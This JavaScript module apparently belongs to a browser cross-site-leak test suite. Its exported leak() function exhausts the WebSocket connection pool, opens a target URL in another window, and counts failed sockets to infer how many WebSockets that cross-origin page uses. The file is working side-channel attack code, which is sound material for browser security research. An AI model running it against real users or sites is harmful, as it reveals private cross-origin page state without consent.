// here we go
let SOCKETS = []

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const exaustWsLimit = async(ws, limit) => {
    for(let i = 0; i < limit; i++){
        let s = new WebSocket(ws)
        SOCKETS.push(s)
    }
    

}

const closeWs = (socks=SOCKETS) => {
    for(let s of socks.reverse()){
        s.close()
    }
}

const filterWS = (state) => {
    // connecting state = 0
    let res = SOCKETS.filter(s => s.readyState === state)
    return res
}

const debugWsStatus = () => {
    let res = {
        connecting: 0,
        open: 0,
        closing: 0,
        closed: 0
    }
    for(let s of SOCKETS){
        let state = s.readyState
        if(state === 0){
            res.connecting++
        }
        else if(state === 1){
            res.open++
        }
        else if(state === 2){
            res.closing++
        }
        else if(state === 3){
            res.closed++
        }
        else{
            console.warn(s, state, 'WTF unknow s.readyState')
        }
    }
    return res
}


const noNewWs = () => {
    return new Promise(async(r) => {
        let tmp = -1 
        while(tmp !== filterWS(1).length){
            tmp = filterWS(1).length
            await sleep(1500)
        }
        return r(1)
    })
}

const waitUntilClosed = () => {
    return new Promise(async(r) => {
        while(filterWS(2).length){
            await sleep(200)
        }
        return r(1)
    })
}

const iframeWs = (ws) => {
    let i = document.createElement('iframe')
    i.src=`https://crossorigin.xsinator.xyz/testcases/tests/websocket.php?1`
    document.body.append(i)
    return i
}

const leak = async(url, waitTime=2000, limit=255) => {
    let t = performance.now()
    let ws = 'wss://xsinator.com/ws'
    console.log(`[+] Exausting WS limit until we can not open any new WS.`)
    // create one websocket in an out-of-process iframe, because of the 255 limit per site vs the 256 global ws connection limit
    let i = iframeWs()
    await exaustWsLimit(ws, limit)
    console.debug(debugWsStatus(), '=', SOCKETS.length)

    //wait until we dont open any new connections
    await noNewWs()
    console.debug(debugWsStatus(), '=', SOCKETS.length)
    console.log(`[+] Cannot open any new WS.`)

    // close any ws not opened
    let connectingWS = filterWS(0)
    console.log(`[+] ${connectingWS.length} WS are already open.`)
    closeWs(connectingWS)
    await sleep(300)
    console.debug(debugWsStatus(), '=', SOCKETS.length)
    
    // make some room
    let d = 10
    closeWs(SOCKETS.slice(0, d))
    console.log(`[+] Closing ${d} ws ..`)
    console.debug(debugWsStatus(), '=', SOCKETS.length)

    console.log(`[+] Opening ${url} in window.`)
    window.WW.location = url
    // wait for WS to connect on url
    await sleep(waitTime)
    // try to add some more again
    console.log(`[+] Checking number of WS.`)
    await exaustWsLimit(ws, d)
    
    await noNewWs()
    console.debug(debugWsStatus(), '=', SOCKETS.length)
    // number of connecting ws
    let res = filterWS(0).length
    console.log(`[+] ${res} WS on ${url} and ${connectingWS.length} WS were already opened.`)

    // cleanup
    closeWs(SOCKETS)
    i.remove()
    window.WW.location = 'about:blank'
    await waitUntilClosed()
    SOCKETS = []
    console.debug(`Took ${performance.now() - t}ms.`)
    return res
}

export { leak }